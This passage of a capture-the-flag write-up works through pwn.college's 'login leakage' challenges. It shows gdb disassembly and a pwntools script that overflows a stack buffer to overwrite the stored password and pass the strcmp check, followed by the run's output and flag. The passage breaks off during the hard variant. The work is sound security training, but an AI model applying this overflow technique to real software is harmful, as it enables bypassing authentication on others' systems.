We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
Payload size: 
```

Let's open the program within GDB.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001110  __cxa_finalize@plt
0x0000000000001120  putchar@plt
0x0000000000001130  __errno_location@plt
0x0000000000001140  puts@plt
0x0000000000001150  write@plt
0x0000000000001160  printf@plt
0x0000000000001170  geteuid@plt
0x0000000000001180  close@plt
0x0000000000001190  read@plt
0x00000000000011a0  strcmp@plt
0x00000000000011b0  setvbuf@plt
0x00000000000011c0  open@plt
0x00000000000011d0  __isoc99_scanf@plt
0x00000000000011e0  exit@plt
0x00000000000011f0  strerror@plt
0x0000000000001200  _start
0x0000000000001230  deregister_tm_clones
0x0000000000001260  register_tm_clones
0x00000000000012a0  __do_global_dtors_aux
0x00000000000012e0  frame_dummy
0x00000000000012e9  DUMP_STACK
0x00000000000014ec  bin_padding
0x0000000000001c17  win
0x0000000000001d1e  challenge
0x0000000000002198  main
0x0000000000002230  __libc_csu_init
0x00000000000022a0  __libc_csu_fini
0x00000000000022a8  _fini
```

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000001d1e <+0>:     endbr64
   0x0000000000001d22 <+4>:     push   rbp
   0x0000000000001d23 <+5>:     mov    rbp,rsp
   0x0000000000001d26 <+8>:     sub    rsp,0x7a0
   0x0000000000001d2d <+15>:    mov    DWORD PTR [rbp-0x784],edi
   0x0000000000001d33 <+21>:    mov    QWORD PTR [rbp-0x790],rsi
   0x0000000000001d3a <+28>:    mov    QWORD PTR [rbp-0x798],rdx
   0x0000000000001d41 <+35>:    lea    rdx,[rbp-0x770]
   0x0000000000001d48 <+42>:    mov    eax,0x0
   0x0000000000001d4d <+47>:    mov    ecx,0xeb
   0x0000000000001d52 <+52>:    mov    rdi,rdx
   0x0000000000001d55 <+55>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000001d58 <+58>:    mov    rdx,rdi
   0x0000000000001d5b <+61>:    mov    DWORD PTR [rdx],eax
   0x0000000000001d5d <+63>:    add    rdx,0x4
   0x0000000000001d61 <+67>:    mov    WORD PTR [rdx],ax
   0x0000000000001d64 <+70>:    add    rdx,0x2
   0x0000000000001d68 <+74>:    mov    esi,0x0
   0x0000000000001d6d <+79>:    lea    rdi,[rip+0x1480]        # 0x31f4
   0x0000000000001d74 <+86>:    mov    eax,0x0
   0x0000000000001d79 <+91>:    call   0x11c0 <open@plt>
   0x0000000000001d7e <+96>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001d81 <+99>:    lea    rax,[rbp-0x770]
   0x0000000000001d88 <+106>:   lea    rcx,[rax+0x756]
   0x0000000000001d8f <+113>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001d92 <+116>:   mov    edx,0x8
   0x0000000000001d97 <+121>:   mov    rsi,rcx
   0x0000000000001d9a <+124>:   mov    edi,eax
   0x0000000000001d9c <+126>:   call   0x1190 <read@plt>
   0x0000000000001da1 <+131>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001da4 <+134>:   mov    edi,eax
   0x0000000000001da6 <+136>:   call   0x1180 <close@plt>
   0x0000000000001dab <+141>:   mov    QWORD PTR [rbp-0x778],0x0
   0x0000000000001db6 <+152>:   lea    rdi,[rip+0x144b]        # 0x3208
   0x0000000000001dbd <+159>:   call   0x1140 <puts@plt>
   0x0000000000001dc2 <+164>:   mov    rax,rsp
   0x0000000000001dc5 <+167>:   mov    QWORD PTR [rip+0x33cc],rax        # 0x5198 <sp_>
   0x0000000000001dcc <+174>:   mov    rax,rbp
   0x0000000000001dcf <+177>:   mov    QWORD PTR [rip+0x33a2],rax        # 0x5178 <bp_>
   0x0000000000001dd6 <+184>:   mov    rdx,QWORD PTR [rip+0x339b]        # 0x5178 <bp_>
   0x0000000000001ddd <+191>:   mov    rax,QWORD PTR [rip+0x33b4]        # 0x5198 <sp_>
   0x0000000000001de4 <+198>:   sub    rdx,rax
   0x0000000000001de7 <+201>:   mov    rax,rdx
   0x0000000000001dea <+204>:   shr    rax,0x3
   0x0000000000001dee <+208>:   add    rax,0x2
   0x0000000000001df2 <+212>:   mov    QWORD PTR [rip+0x338f],rax        # 0x5188 <sz_>
   0x0000000000001df9 <+219>:   mov    rax,QWORD PTR [rip+0x3378]        # 0x5178 <bp_>
   0x0000000000001e00 <+226>:   add    rax,0x8
   0x0000000000001e04 <+230>:   mov    QWORD PTR [rip+0x3385],rax        # 0x5190 <rp_>
   0x0000000000001e0b <+237>:   lea    rdi,[rip+0x142e]        # 0x3240
   0x0000000000001e12 <+244>:   call   0x1140 <puts@plt>
   0x0000000000001e17 <+249>:   mov    rdx,QWORD PTR [rip+0x336a]        # 0x5188 <sz_>
   0x0000000000001e1e <+256>:   mov    rax,QWORD PTR [rip+0x3373]        # 0x5198 <sp_>
   0x0000000000001e25 <+263>:   mov    rsi,rdx
   0x0000000000001e28 <+266>:   mov    rdi,rax
   0x0000000000001e2b <+269>:   call   0x12e9 <DUMP_STACK>
   0x0000000000001e30 <+274>:   mov    rdx,QWORD PTR [rip+0x3341]        # 0x5178 <bp_>
   0x0000000000001e37 <+281>:   mov    rax,QWORD PTR [rip+0x335a]        # 0x5198 <sp_>
   0x0000000000001e3e <+288>:   mov    rsi,rax
   0x0000000000001e41 <+291>:   lea    rdi,[rip+0x1440]        # 0x3288
   0x0000000000001e48 <+298>:   mov    eax,0x0
   0x0000000000001e4d <+303>:   call   0x1160 <printf@plt>
   0x0000000000001e52 <+308>:   mov    rax,QWORD PTR [rip+0x332f]        # 0x5188 <sz_>
   0x0000000000001e59 <+315>:   mov    rsi,rax
   0x0000000000001e5c <+318>:   lea    rdi,[rip+0x146d]        # 0x32d0
   0x0000000000001e63 <+325>:   mov    eax,0x0
   0x0000000000001e68 <+330>:   call   0x1160 <printf@plt>
   0x0000000000001e6d <+335>:   lea    rdi,[rip+0x14a4]        # 0x3318
   0x0000000000001e74 <+342>:   call   0x1140 <puts@plt>
   0x0000000000001e79 <+347>:   mov    rax,QWORD PTR [rip+0x3308]        # 0x5188 <sz_>
   0x0000000000001e80 <+354>:   shl    rax,0x3
   0x0000000000001e84 <+358>:   mov    rsi,rax
   0x0000000000001e87 <+361>:   lea    rdi,[rip+0x14cf]        # 0x335d
   0x0000000000001e8e <+368>:   mov    eax,0x0
   0x0000000000001e93 <+373>:   call   0x1160 <printf@plt>
   0x0000000000001e98 <+378>:   lea    rax,[rbp-0x770]
   0x0000000000001e9f <+385>:   mov    rsi,rax
   0x0000000000001ea2 <+388>:   lea    rdi,[rip+0x14cf]        # 0x3378
   0x0000000000001ea9 <+395>:   mov    eax,0x0
   0x0000000000001eae <+400>:   call   0x1160 <printf@plt>
   0x0000000000001eb3 <+405>:   lea    rdi,[rip+0x1506]        # 0x33c0
   0x0000000000001eba <+412>:   call   0x1140 <puts@plt>
   0x0000000000001ebf <+417>:   lea    rdi,[rip+0x154a]        # 0x3410
   0x0000000000001ec6 <+424>:   call   0x1140 <puts@plt>
   0x0000000000001ecb <+429>:   mov    esi,0x36
   0x0000000000001ed0 <+434>:   lea    rdi,[rip+0x1569]        # 0x3440
   0x0000000000001ed7 <+441>:   mov    eax,0x0
   0x0000000000001edc <+446>:   call   0x1160 <printf@plt>
   0x0000000000001ee1 <+451>:   lea    rdi,[rip+0x15b0]        # 0x3498
   0x0000000000001ee8 <+458>:   call   0x1140 <puts@plt>
   0x0000000000001eed <+463>:   lea    rdi,[rip+0x15dc]        # 0x34d0
   0x0000000000001ef4 <+470>:   call   0x1140 <puts@plt>
   0x0000000000001ef9 <+475>:   lea    rax,[rbp-0x770]
   0x0000000000001f00 <+482>:   add    rax,0x756
   0x0000000000001f06 <+488>:   mov    edx,0x756
   0x0000000000001f0b <+493>:   mov    rsi,rax
   0x0000000000001f0e <+496>:   lea    rdi,[rip+0x1623]        # 0x3538
   0x0000000000001f15 <+503>:   mov    eax,0x0
   0x0000000000001f1a <+508>:   call   0x1160 <printf@plt>
   0x0000000000001f1f <+513>:   lea    rdi,[rip+0x1662]        # 0x3588
   0x0000000000001f26 <+520>:   call   0x1140 <puts@plt>
   0x0000000000001f2b <+525>:   lea    rdi,[rip+0x16b6]        # 0x35e8
   0x0000000000001f32 <+532>:   call   0x1140 <puts@plt>
   0x0000000000001f37 <+537>:   lea    rdi,[rip+0x16ea]        # 0x3628
   0x0000000000001f3e <+544>:   call   0x1140 <puts@plt>
   0x0000000000001f43 <+549>:   lea    rdi,[rip+0x171b]        # 0x3665
   0x0000000000001f4a <+556>:   mov    eax,0x0
   0x0000000000001f4f <+561>:   call   0x1160 <printf@plt>
   0x0000000000001f54 <+566>:   lea    rax,[rbp-0x778]
   0x0000000000001f5b <+573>:   mov    rsi,rax
   0x0000000000001f5e <+576>:   lea    rdi,[rip+0x170f]        # 0x3674
   0x0000000000001f65 <+583>:   mov    eax,0x0
   0x0000000000001f6a <+588>:   call   0x11d0 <__isoc99_scanf@plt>
   0x0000000000001f6f <+593>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001f76 <+600>:   mov    rsi,rax
   0x0000000000001f79 <+603>:   lea    rdi,[rip+0x16f8]        # 0x3678
   0x0000000000001f80 <+610>:   mov    eax,0x0
   0x0000000000001f85 <+615>:   call   0x1160 <printf@plt>
   0x0000000000001f8a <+620>:   lea    rax,[rbp-0x770]
   0x0000000000001f91 <+627>:   mov    rsi,rax
   0x0000000000001f94 <+630>:   lea    rdi,[rip+0x170d]        # 0x36a8
   0x0000000000001f9b <+637>:   mov    eax,0x0
   0x0000000000001fa0 <+642>:   call   0x1160 <printf@plt>
   0x0000000000001fa5 <+647>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001fac <+654>:   lea    rdx,[rax-0x36]
   0x0000000000001fb0 <+658>:   lea    rcx,[rbp-0x770]
   0x0000000000001fb7 <+665>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001fbe <+672>:   add    rax,rcx
   0x0000000000001fc1 <+675>:   mov    rsi,rax
   0x0000000000001fc4 <+678>:   lea    rdi,[rip+0x1725]        # 0x36f0
   0x0000000000001fcb <+685>:   mov    eax,0x0
   0x0000000000001fd0 <+690>:   call   0x1160 <printf@plt>
   0x0000000000001fd5 <+695>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001fdc <+702>:   mov    rsi,rax
   0x0000000000001fdf <+705>:   lea    rdi,[rip+0x1762]        # 0x3748
   0x0000000000001fe6 <+712>:   mov    eax,0x0
   0x0000000000001feb <+717>:   call   0x1160 <printf@plt>
   0x0000000000001ff0 <+722>:   mov    rdx,QWORD PTR [rbp-0x778]
   0x0000000000001ff7 <+729>:   lea    rax,[rbp-0x770]
   0x0000000000001ffe <+736>:   mov    rsi,rax
   0x0000000000002001 <+739>:   mov    edi,0x0
   0x0000000000002006 <+744>:   call   0x1190 <read@plt>
   0x000000000000200b <+749>:   mov    DWORD PTR [rbp-0x8],eax
   0x000000000000200e <+752>:   cmp    DWORD PTR [rbp-0x8],0x0
   0x0000000000002012 <+756>:   jns    0x2040 <challenge+802>
   0x0000000000002014 <+758>:   call   0x1130 <__errno_location@plt>
   0x0000000000002019 <+763>:   mov    eax,DWORD PTR [rax]
   0x000000000000201b <+765>:   mov    edi,eax
   0x000000000000201d <+767>:   call   0x11f0 <strerror@plt>
   0x0000000000002022 <+772>:   mov    rsi,rax
   0x0000000000002025 <+775>:   lea    rdi,[rip+0x1744]        # 0x3770
   0x000000000000202c <+782>:   mov    eax,0x0
   0x0000000000002031 <+787>:   call   0x1160 <printf@plt>
   0x0000000000002036 <+792>:   mov    edi,0x1
   0x000000000000203b <+797>:   call   0x11e0 <exit@plt>
   0x0000000000002040 <+802>:   mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000002043 <+805>:   mov    esi,eax
   0x0000000000002045 <+807>:   lea    rdi,[rip+0x1748]        # 0x3794
   0x000000000000204c <+814>:   mov    eax,0x0
   0x0000000000002051 <+819>:   call   0x1160 <printf@plt>
   0x0000000000002056 <+824>:   lea    rdi,[rip+0x174b]        # 0x37a8
   0x000000000000205d <+831>:   call   0x1140 <puts@plt>
   0x0000000000002062 <+836>:   mov    rdx,QWORD PTR [rip+0x311f]        # 0x5188 <sz_>
   0x0000000000002069 <+843>:   mov    rax,QWORD PTR [rip+0x3128]        # 0x5198 <sp_>
   0x0000000000002070 <+850>:   mov    rsi,rdx
   0x0000000000002073 <+853>:   mov    rdi,rax
   0x0000000000002076 <+856>:   call   0x12e9 <DUMP_STACK>
   0x000000000000207b <+861>:   lea    rdi,[rip+0x174f]        # 0x37d1
   0x0000000000002082 <+868>:   call   0x1140 <puts@plt>
   0x0000000000002087 <+873>:   lea    rax,[rbp-0x770]
   0x000000000000208e <+880>:   mov    rsi,rax
   0x0000000000002091 <+883>:   lea    rdi,[rip+0x1758]        # 0x37f0
   0x0000000000002098 <+890>:   mov    eax,0x0
   0x000000000000209d <+895>:   call   0x1160 <printf@plt>
   0x00000000000020a2 <+900>:   lea    rax,[rbp-0x770]
   0x00000000000020a9 <+907>:   add    rax,0x756
   0x00000000000020af <+913>:   mov    rsi,rax
   0x00000000000020b2 <+916>:   lea    rdi,[rip+0x175f]        # 0x3818
   0x00000000000020b9 <+923>:   mov    eax,0x0
   0x00000000000020be <+928>:   call   0x1160 <printf@plt>
   0x00000000000020c3 <+933>:   mov    edi,0xa
   0x00000000000020c8 <+938>:   call   0x1120 <putchar@plt>
   0x00000000000020cd <+943>:   mov    eax,DWORD PTR [rbp-0x8]
   0x00000000000020d0 <+946>:   movsxd rdx,eax
   0x00000000000020d3 <+949>:   lea    rax,[rbp-0x770]
   0x00000000000020da <+956>:   add    rdx,rax
   0x00000000000020dd <+959>:   mov    rax,QWORD PTR [rip+0x30ac]        # 0x5190 <rp_>
   0x00000000000020e4 <+966>:   add    rax,0x2
   0x00000000000020e8 <+970>:   cmp    rdx,rax
   0x00000000000020eb <+973>:   jbe    0x2129 <challenge+1035>
   0x00000000000020ed <+975>:   lea    rdi,[rip+0x174c]        # 0x3840
   0x00000000000020f4 <+982>:   call   0x1140 <puts@plt>
   0x00000000000020f9 <+987>:   lea    rdi,[rip+0x1798]        # 0x3898
   0x0000000000002100 <+994>:   call   0x1140 <puts@plt>
   0x0000000000002105 <+999>:   lea    rdi,[rip+0x17dc]        # 0x38e8
   0x000000000000210c <+1006>:  call   0x1140 <puts@plt>
   0x0000000000002111 <+1011>:  lea    rdi,[rip+0x1818]        # 0x3930
   0x0000000000002118 <+1018>:  call   0x1140 <puts@plt>
   0x000000000000211d <+1023>:  lea    rdi,[rip+0x1851]        # 0x3975
   0x0000000000002124 <+1030>:  call   0x1140 <puts@plt>
   0x0000000000002129 <+1035>:  lea    rdi,[rip+0x184f]        # 0x397f
   0x0000000000002130 <+1042>:  call   0x1140 <puts@plt>
   0x0000000000002135 <+1047>:  lea    rax,[rbp-0x770]
   0x000000000000213c <+1054>:  lea    rdx,[rax+0x756]
   0x0000000000002143 <+1061>:  lea    rax,[rbp-0x770]
   0x000000000000214a <+1068>:  mov    rsi,rdx
   0x000000000000214d <+1071>:  mov    rdi,rax
   0x0000000000002150 <+1074>:  call   0x11a0 <strcmp@plt>
   0x0000000000002155 <+1079>:  test   eax,eax
   0x0000000000002157 <+1081>:  je     0x216f <challenge+1105>
   0x0000000000002159 <+1083>:  lea    rdi,[rip+0x1838]        # 0x3998
   0x0000000000002160 <+1090>:  call   0x1140 <puts@plt>
   0x0000000000002165 <+1095>:  mov    edi,0x1
   0x000000000000216a <+1100>:  call   0x11e0 <exit@plt>
   0x000000000000216f <+1105>:  lea    rdi,[rip+0x1842]        # 0x39b8
   0x0000000000002176 <+1112>:  call   0x1140 <puts@plt>
   0x000000000000217b <+1117>:  mov    eax,0x0
   0x0000000000002180 <+1122>:  call   0x1c17 <win>
   0x0000000000002185 <+1127>:  lea    rdi,[rip+0x1843]        # 0x39cf
   0x000000000000218c <+1134>:  call   0x1140 <puts@plt>
   0x0000000000002191 <+1139>:  mov    eax,0x0
   0x0000000000002196 <+1144>:  leave
   0x0000000000002197 <+1145>:  ret
End of assembler dump.
```

We can see that the `challenge()` function calls `strcmp@plt` to comare two strings pointed to by the `rsi` and `rdi` registers.
This is the password verification mechanism.
If the strings are identical, the reault which is in `rax` is `0`.

After using `test` to check if `rax=0`, the program jumps to `challenge+1105` if the condition is met, and calls `win()`. Else, it exits.

Let's set a breakpoint at `challenge+1074`, right before the call to `strcmp@plt` is made.

```
pwndbg> break *(challenge+1074)
Breakpoint 1 at 0x2150
```

```
pwndbg> run
Starting program: /challenge/login-leakage-easy 
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:

# ---- snip ----

Our stack pointer points to 0x7ffc037530b0, and our base pointer points to 0x7ffc03753850.
This means that we have (decimal) 246 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 1968 bytes.
The input buffer begins at 0x7ffc037530e0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 54 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge is a password checker that will check your input against a randomly generated password.
The password is stored at 0x7ffc03753836, 1878 bytes after the start of your input buffer.
We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
Payload size: 8
You have chosen to send 8 bytes of input!
This will allow you to write from 0x7ffc037530e0 (the start of the input buffer)
right up to (but not including) 0x7ffc037530e8 (which is -46 bytes beyond the end of the buffer).
Send your payload (up to 8 bytes)!
abcdefgh
You sent 8 bytes!
Let's see what happened with the stack:

# ---- snip ----

The program's memory status:
- the input buffer starts at 0x7ffc037530e0
- the password buffer starts at 0x7ffc03753836

Checking Password...

Breakpoint 1, 0x000058dbd29d0150 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
 RAX  0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
 RBX  0x58dbd29d0230 (__libc_csu_init) ◂— endbr64 
 RCX  0x7a0266883297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7fff0b3b3766 ◂— 0xd7dab6104a159525
 RDI  0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
 RSI  0x7fff0b3b3766 ◂— 0xd7dab6104a159525
 R8   0x15
 R9   0x2f
 R10  0x58dbd29d183a ◂— 0x415700000000000a /* '\n' */
 R11  0x246
 R12  0x58dbd29cf200 (_start) ◂— endbr64 
 R13  0x7fff0b3b48a0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff0b3b3780 —▸ 0x7fff0b3b47b0 ◂— 0
 RSP  0x7fff0b3b2fe0 ◂— 0
 RIP  0x58dbd29d0150 (challenge+1074) ◂— call strcmp@plt
──────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
 ► 0x58dbd29d0150 <challenge+1074>    call   strcmp@plt                  <strcmp@plt>
        s1: 0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
        s2: 0x7fff0b3b3766 ◂— 0xd7dab6104a159525
 
   0x58dbd29d0155 <challenge+1079>    test   eax, eax
   0x58dbd29d0157 <challenge+1081>    je     challenge+1105              <challenge+1105>
 
   0x58dbd29d0159 <challenge+1083>    lea    rdi, [rip + 0x1838]     RDI => 0x58dbd29d1998 ◂— 'Password check failed! Exiting!'
   0x58dbd29d0160 <challenge+1090>    call   puts@plt                    <puts@plt>
 
   0x58dbd29d0165 <challenge+1095>    mov    edi, 1                  EDI => 1
   0x58dbd29d016a <challenge+1100>    call   exit@plt                    <exit@plt>
 
   0x58dbd29d016f <challenge+1105>    lea    rdi, [rip + 0x1842]     RDI => 0x58dbd29d19b8 ◂— 'Password check passed!'
   0x58dbd29d0176 <challenge+1112>    call   puts@plt                    <puts@plt>
 
   0x58dbd29d017b <challenge+1117>    mov    eax, 0                  EAX => 0
   0x58dbd29d0180 <challenge+1122>    call   win                         <win>
────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff0b3b2fe0 ◂— 0
01:0008│-798     0x7fff0b3b2fe8 —▸ 0x7fff0b3b48b8 —▸ 0x7fff0b3b6698 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-790     0x7fff0b3b2ff0 —▸ 0x7fff0b3b48a8 —▸ 0x7fff0b3b667a ◂— '/challenge/login-leakage-easy'
03:0018│-788     0x7fff0b3b2ff8 ◂— 0x100000000
04:0020│-780     0x7fff0b3b3000 ◂— 0
05:0028│-778     0x7fff0b3b3008 ◂— 2
06:0030│ rax rdi 0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
07:0038│-768     0x7fff0b3b3018 ◂— 0
──────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
 ► 0   0x58dbd29d0150 challenge+1074
   1   0x58dbd29d021e main+134
   2   0x7a0266799083 __libc_start_main+243
   3   0x58dbd29cf22e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can see that the program compares the first bytes of our payload to the saved password. Ideally, it would compare the saved password with some random number.

Let change the value pointed to by `rdi` to be same as the one pointed to by `rsi`.

```
pwndbg> set *(unsigned long*)$rdi = *(unsigned long*)$rsi
pwndbg> c
Continuing.
Password check passed!
You win! Here is your flag:

  ERROR: Failed to open the flag -- Permission denied!
  Your effective user id is not 0!
  You must directly run the suid binary in order to have the correct permissions!
[Inferior 1 (process 1362) exited with code 0377]
```

We can see that the program calls `win()` for us if the values turn out to be the same.

### Exploit

Since, we control the first 8 bytes of our payload that we write into the buffer, and the challenge also tells us the address of the buffer and the stored address, we can easily set both values to the same string.

That way, the check will succeed and the challenge will call `win()` for us.

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/login-leakage-easy')

# Initialize values
buffer_addr = 0x7ffccd0bfbe0
password_addr = 0x7ffccd0c0336
addr_of_saved_bp = 0x7ffe2e4a66a0
password = 0xdeadbeeffacade00

# Calculate offset & payload_size
offset = password_addr - buffer_addr
payload_size = offset + 8

# Build payload
payload = p64(password)
payload += b"A" * (offset - 8)
payload += p64(password)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~login-leakage-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/login-leakage-easy': pid 4616
/home/hacker/script.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(bytes_to_read))
[*] Switching to interactive mode
 (up to 1886 bytes)!
You sent 1886 bytes!
Let's see what happened with the stack:

# ---- snip ----

The program's memory status:
- the input buffer starts at 0x7ffe8b13d3b0
- the password buffer starts at 0x7ffe8b13db06

Checking Password...
Password check passed!
You win! Here is your flag:
pwn.college{YCCUOqCpOZtJeDomtA34lWAsydW.QXwgzN4EDL4ITM0EzW}


Goodbye!
[*] Got EOF while reading in interactive
$
```

&nbsp;

## Login leakage (Hard)

```
hacker@program-security~login-leakage-hard:/$ /challenge/login-leakage-hard 
Payload size: 2
Send your payload (up to 2 bytes)!
aa
Password check failed! Exiting!
```

In this challenge we do not get any information from running the program.

Requirements to craft an exploit:

* [ ] Location of buffer
* [ ] Location of password

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001100  __cxa_finalize@plt
0x0000000000001110  __errno_location@plt
0x0000000000001120  puts@plt
0x0000000000001130  write@plt
0x0000000000001140  printf@plt
0x0000000000001150  geteuid@plt
0x0000000000001160  close@plt
0x0000000000001170  read@plt
0x0000000000001180  strcmp@plt
0x0000000000001190  setvbuf@plt
0x00000000000011a0  open@plt
0x00000000000011b0  __isoc99_scanf@plt
0x00000000000011c0  exit@plt
0x00000000000011d0  strerror@plt
0x00000000000011e0  _start
0x0000000000001210  deregister_tm_clones
0x0000000000001240  register_tm_clones
0x0000000000001280  __do_global_dtors_aux
0x00000000000012c0  frame_dummy
0x00000000000012c9  bin_padding
0x00000000000018b3  win
0x00000000000019ba  challenge
0x0000000000001b3c  main
0x0000000000001bd0  __libc_csu_init
0x0000000000001c40  __libc_csu_fini
0x0000000000001c48  _fini
pwndbg> 
```

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000000019ba <+0>:     endbr64
   0x00000000000019be <+4>:     push   rbp
   0x00000000000019bf <+5>:     mov    rbp,rsp
   0x00000000000019c2 <+8>:     sub    rsp,0x670
   0x00000000000019c9 <+15>:    mov    DWORD PTR [rbp-0x654],edi
   0x00000000000019cf <+21>:    mov    QWORD PTR [rbp-0x660],rsi
   0x00000000000019d6 <+28>:    mov    QWORD PTR [rbp-0x668],rdx
   0x00000000000019dd <+35>:    lea    rdx,[rbp-0x640]
   0x00000000000019e4 <+42>:    mov    eax,0x0
   0x00000000000019e9 <+47>:    mov    ecx,0xc6
   0x00000000000019ee <+52>:    mov    rdi,rdx
   0x00000000000019f1 <+55>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000000019f4 <+58>:    mov    esi,0x0
   0x00000000000019f9 <+63>:    lea    rdi,[rip+0x70c]        # 0x210c
   0x0000000000001a00 <+70>:    mov    eax,0x0
   0x0000000000001a05 <+75>:    call   0x11a0 <open@plt>
   0x0000000000001a0a <+80>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001a0d <+83>:    lea    rax,[rbp-0x640]
   0x0000000000001a14 <+90>:    lea    rcx,[rax+0x628]
   0x0000000000001a1b <+97>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001a1e <+100>:   mov    edx,0x8
   0x0000000000001a23 <+105>:   mov    rsi,rcx
   0x0000000000001a26 <+108>:   mov    edi,eax
   0x0000000000001a28 <+110>:   call   0x1170 <read@plt>
   0x0000000000001a2d <+115>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001a30 <+118>:   mov    edi,eax
   0x0000000000001a32 <+120>:   call   0x1160 <close@plt>
   0x0000000000001a37 <+125>:   mov    QWORD PTR [rbp-0x648],0x0
   0x0000000000001a42 <+136>:   lea    rdi,[rip+0x6d0]        # 0x2119
   0x0000000000001a49 <+143>:   mov    eax,0x0
   0x0000000000001a4e <+148>:   call   0x1140 <printf@plt>
   0x0000000000001a53 <+153>:   lea    rax,[rbp-0x648]
   0x0000000000001a5a <+160>:   mov    rsi,rax
   0x0000000000001a5d <+163>:   lea    rdi,[rip+0x6c4]        # 0x2128
   0x0000000000001a64 <+170>:   mov    eax,0x0
   0x0000000000001a69 <+175>:   call   0x11b0 <__isoc99_scanf@plt>
   0x0000000000001a6e <+180>:   mov    rax,QWORD PTR [rbp-0x648]
   0x0000000000001a75 <+187>:   mov    rsi,rax
   0x0000000000001a78 <+190>:   lea    rdi,[rip+0x6b1]        # 0x2130
   0x0000000000001a7f <+197>:   mov    eax,0x0
   0x0000000000001a84 <+202>:   call   0x1140 <printf@plt>
   0x0000000000001a89 <+207>:   mov    rdx,QWORD PTR [rbp-0x648]
   0x0000000000001a90 <+214>:   lea    rax,[rbp-0x640]
   0x0000000000001a97 <+221>:   mov    rsi,rax
   0x0000000000001a9a <+224>:   mov    edi,0x0
   0x0000000000001a9f <+229>:   call   0x1170 <read@plt>
   0x0000000000001aa4 <+234>:   mov    DWORD PTR [rbp-0x8],eax
   0x0000000000001aa7 <+237>:   cmp    DWORD PTR [rbp-0x8],0x0
   0x0000000000001aab <+241>:   jns    0x1ad9 <challenge+287>
   0x0000000000001aad <+243>:   call   0x1110 <__errno_location@plt>
   0x0000000000001ab2 <+248>:   mov    eax,DWORD PTR [rax]
   0x0000000000001ab4 <+250>:   mov    edi,eax
   0x0000000000001ab6 <+252>:   call   0x11d0 <strerror@plt>
   0x0000000000001abb <+257>:   mov    rsi,rax
   0x0000000000001abe <+260>:   lea    rdi,[rip+0x693]        # 0x2158
   0x0000000000001ac5 <+267>:   mov    eax,0x0
   0x0000000000001aca <+272>:   call   0x1140 <printf@plt>
   0x0000000000001acf <+277>:   mov    edi,0x1
   0x0000000000001ad4 <+282>:   call   0x11c0 <exit@plt>
   0x0000000000001ad9 <+287>:   lea    rax,[rbp-0x640]
   0x0000000000001ae0 <+294>:   lea    rdx,[rax+0x628]
   0x0000000000001ae7 <+301>:   lea    rax,[rbp-0x640]
   0x0000000000001aee <+308>:   mov    rsi,rdx
   0x0000000000001af1 <+311>:   mov    rdi,rax
   0x0000000000001af4 <+314>:   call   0x1180 <strcmp@plt>
   0x0000000000001af9 <+319>:   test   eax,eax
   0x0000000000001afb <+321>:   je     0x1b13 <challenge+345>
   0x0000000000001afd <+323>:   lea    rdi,[rip+0x67c]        # 0x2180
   0x0000000000001b04 <+330>:   call   0x1120 <puts@plt>
   0x0000000000001b09 <+335>:   mov    edi,0x1
   0x0000000000001b0e <+340>:   call   0x11c0 <exit@plt>
   0x0000000000001b13 <+345>:   lea    rdi,[rip+0x686]        # 0x21a0
   0x0000000000001b1a <+352>:   call   0x1120 <puts@plt>
   0x0000000000001b1f <+357>:   mov    eax,0x0
   0x0000000000001b24 <+362>:   call   0x18b3 <win>
   0x0000000000001b29 <+367>:   lea    rdi,[rip+0x687]        # 0x21b7
   0x0000000000001b30 <+374>:   call   0x1120 <puts@plt>
   0x0000000000001b35 <+379>:   mov    eax,0x0
   0x0000000000001b3a <+384>:   leave
   0x0000000000001b3b <+385>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+314` right before the call to `strcmp@plt` is made.

```
